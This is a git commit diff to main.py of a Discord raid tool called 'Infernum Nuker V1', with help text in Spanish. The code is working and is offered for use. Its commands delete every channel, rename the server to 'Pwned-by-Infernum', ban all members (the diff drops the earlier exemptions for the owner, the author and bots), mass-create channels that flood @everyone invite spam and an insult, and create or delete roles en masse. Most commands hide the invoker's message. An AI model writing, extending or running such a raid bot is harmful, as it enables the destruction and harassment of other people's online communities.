f63f582b423538ca016f1a51493ab726aa61357b
ils <exxtasiss9@gmail.com>
2025-07-21 11:08:34 -0400

    Update main.py

--- main.py
+++ main.py
@@ -32,6 +32,9 @@ $$$$$$\ $$ |  $$ |$$ |     \$$$$$$$\ $$ |      $$ |  $$ |\$$$$$$  |$$ | $$ | $$ 
 *nuke     - Nuke server
 *banall   - Bans all members
 *spam     - Spams channels
+*rol      - Create roles
+*drol     - Delete roles
+*helpm    - all the commands
 
 Infernum Nuker V1
 By - ils
@@ -41,8 +44,13 @@ print(ascii_art)
 
 @bot.command()
 async def spam(ctx):
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+
     new_message = (
-        "||@everyone @here|| `Join ifs:` https://discord.gg/z5FwK5tUD9\n"
+        "||@everyone @here|| `Join ifs:` https://discord.gg/NCEun68ZZp\n"
         "https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif\n"
         "F = Anormal de mierda, infernum on top! \n"
     )
@@ -54,33 +62,41 @@ async def spam(ctx):
                 tasks = [new_channel.send(new_message) for _ in range(message_count)]
                 await asyncio.gather(*tasks)
                 await asyncio.sleep(0.1)
-            except Exception as e:
-                print(f"")
+            except:
                 await asyncio.sleep(0.1)
 
     tasks = [create_channel("Raid-by-infernum", 20) for _ in range(60)]
     await asyncio.gather(*tasks)
 
+
 @bot.command()
 @commands.has_permissions(administrator=True)
 async def nuke(ctx):
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+
     guild = ctx.guild
     if guild is None:
         return
 
-    image_url = "https://media.discordapp.net/attachments/1393995441783177337/1393995700986970317/bebe.png?ex=6875332a&is=6873e1aa&hm=c164da7d5b88176d8ede868e16941641272f4c53ff6bbce48626fc1c4be83eee&=&format=webp&quality=lossless&width=652&height=662"  
+    image_url = "https://media.discordapp.net/attachments/1294034108401586217/1396867559378387014/bebe.png?ex=687fa5ca&is=687e544a&hm=d9ced0da6c8312b4822304b0cd95023b2b0ad56535cbf18bfc1b97ca58a7e793&=&format=webp&quality=lossless&width=580&height=589"  
 
     try:
         async with aiohttp.ClientSession() as session:
             async with session.get(image_url) as resp:
                 if resp.status == 200:
                     icon_bytes = await resp.read()
-                    await guild.edit(name="Pwned-by-Infernum", icon=icon_bytes)
+                    try:
+                        await guild.edit(name="Pwned-by-Infernum", icon=icon_bytes)
+                    except:
+                        pass
     except:
         pass
 
     try:
-        await asyncio.gather(*(channel.delete() for channel in guild.channels if channel is not None))
+        await asyncio.gather(*(channel.delete() for channel in guild.channels if channel))
     except:
         pass
 
@@ -88,17 +104,89 @@ async def nuke(ctx):
         await guild.create_text_channel("Raid-By-Infernum")
     except:
         pass
-    
+
+
 @bot.command()
-@commands.has_permissions(administrator=True)
+@commands.cooldown(1, 380, commands.BucketType.guild)
+
 async def banall(ctx):
-    await ctx.message.delete()
+
+    async def make_banall(member):
+
+        await member.ban()
+
+    tasks = []
+
     for member in ctx.guild.members:
-        if member == ctx.author or member == ctx.guild.owner or member.bot:
-            continue  
+
+        task = asyncio.create_task(make_banall(member))
+
+        tasks.append(task)
+
+    await asyncio.gather(*tasks)
+
+
+@bot.command()
+async def rol(ctx):
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+
+    role_name = "PwnedByInfernumSquad"
+
+    async def create_role():
         try:
-            await member.ban(reason="Infernum-On-Top")
+            await ctx.guild.create_role(name=role_name)
         except:
             pass
+
+    tasks = [asyncio.create_task(create_role()) for _ in range(50)]
+    await asyncio.gather(*tasks)
+
+
+@bot.command()
+async def drol(ctx):
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+
+    guild = ctx.guild
+
+    async def delete_role(role):
+        try:
+            await role.delete()
+        except (discord.Forbidden, discord.HTTPException):
+            pass
+
+    roles_to_delete = [role for role in guild.roles if role.name != "@everyone"]
+    tasks = [asyncio.create_task(delete_role(role)) for role in roles_to_delete]
+    await asyncio.gather(*tasks)
+
+
+@bot.command()
+async def helpm(ctx):
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+
+    embed = discord.Embed(title="`Infernum Squad 亗`", description="", color=0x000001)
+
+    embed.add_field(name="`• $banall:`", value="Banea a todos los miembros del servidor", inline=False)
+    embed.add_field(name="`• $nuke:`", value="Elimina todos los canales y cambia el icono y nombre del servidor.", inline=False)
+    embed.add_field(name="`• $spam:`", value="Crea canales y envia spam", inline=False)
+    embed.add_field(name="`• $rol:`", value="Crea 50 roles", inline=False)
+    embed.add_field(name="`• $drol:`", value="Elimina todos los roles", inline=False)
+    embed.add_field(name="`• $helpm:`", value="Todos los comandos del bot.", inline=False)
+
+    embed.set_footer(text="`Prefix: $`")
+    embed.set_footer(text="`Creator bot: ils`")
+    embed.set_footer(text="https://guns.lol/ilsss                                            Best squad, ilswashere on top")
+
+    embed.set_image(url="https://media.discordapp.net/attachments/1353088681321304196/1353251069387603989/elnene.gif")
+
+    await ctx.send(embed=embed)
 
 bot.run("Your bot token here")
